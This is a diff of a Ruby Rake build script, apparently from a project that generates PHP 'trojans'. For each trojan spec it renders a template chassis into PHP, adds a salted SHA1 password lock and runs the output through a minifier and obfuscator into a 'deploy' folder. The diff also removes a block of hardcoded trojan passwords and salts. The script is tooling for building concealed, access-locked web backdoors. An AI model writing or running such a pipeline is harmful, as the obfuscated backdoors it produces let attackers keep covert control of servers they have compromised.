@@ -1,19 +1,3 @@
-
-# specify passwords to lock each trojan
-locks = {
-    :one => {
-        :password => 'b4afcf3d99',
-        :salt     => 'ddb28e78ab',
-        :hash     => 'the-hash',
-    },
-    :two => {
-        :password => '3dadef2cf4',
-        :salt     => '6cbdb4798a',
-        :hash     => 'the-hash',
-    },
-}
-
-# ----------------------------------------------------------------------------
 require 'digest/sha1'
 require 'erb'
 require 'json'
@@ -93,30 +77,38 @@ namespace :trojan do
 
             # iterate over the PHP-spec trojans
             `ls ./trojan/spec/php`.split.each do |f|
+                # buffer the erb parameters
+                params = {}
+
                 # load the specs
                 trojan =  JSON::parse(File.read('./trojan/spec/php/' + f))
 
                 # calculate the password hash
-                params[:password] = Digest::SHA1.hexdigest(trojan.password + trojan.salt)
+                params[:salt] = trojan['salt']
+                params[:hash] = Digest::SHA1.hexdigest(trojan['password'] + trojan['salt'])
 
                 # load the trojan payloads
+                #trojan['payloads'].each do |payload|
+                #    puts payload
+                #end
+                #exit
                 
                 # compile the trojan's erb template
-                erb = ERB.new(File.read('./trojan/template/php/chassis/' + trojan.chassis + '.php.erb' ), 0, '<>', 'buffer')
+                erb = ERB.new(File.read('./trojan/template/php/chassis/' + trojan['chassis'] + '.php.erb' ), 0, '<>', 'buffer')
 
-                # write the erb result to a temporary file
-                #f = File.new('./trojans/plaintext/tmp.trojan.php', 'w')
-                #f.write(erb.result(binding))
-                #f.close
+                # write the erb result to a debug file
+                debug_file  = "./trojan/bin/debug/php/#{trojan['name']}.php"
+                deploy_file = "./trojan/bin/deploy/php/#{trojan['name']}.php"
 
-                # process the temporary file with the PHP minifier and obfuscator
-                #`php -f ./lib/build/obfuscate.php './trojans/plaintext/tmp.trojan.php' > ./trojans/obfuscated/o.php`
+                f = File.new(debug_file, 'w')
+                f.write(erb.result(binding))
+                f.close
 
-                # delete the temporary file
-                #File.delete('./trojans/plaintext/tmp.trojan.php')
-                
+                # process the debug file with the PHP minifier and obfuscator
+                puts `php -f ./lib/build/php/obfuscate.php '#{debug_file}' > '#{deploy_file}'`
+
                 # complete
-                #puts 'done.'
+                puts 'done.'
             end
         end
     end
